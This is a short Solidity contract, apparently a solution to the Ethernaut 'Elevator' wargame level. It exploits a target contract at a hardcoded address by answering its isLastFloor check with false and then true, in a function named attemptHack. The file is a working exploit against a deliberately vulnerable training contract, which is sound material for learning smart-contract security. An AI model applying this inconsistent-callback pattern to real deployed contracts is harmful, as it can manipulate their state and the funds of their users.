// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Build {
  bool public flipped = false;

  Elevator public el = Elevator(0x2109Eb1BA8456a2615B42d64Fd9B26220cA206f0);

  function isLastFloor(uint)  external returns (bool) {
    if(flipped){
      flipped = false;
      return true;
    }
    else{
      flipped = true;
      return false;
    }
  }

  function attemptHack() public {
    el.goTo(10);
  }
}
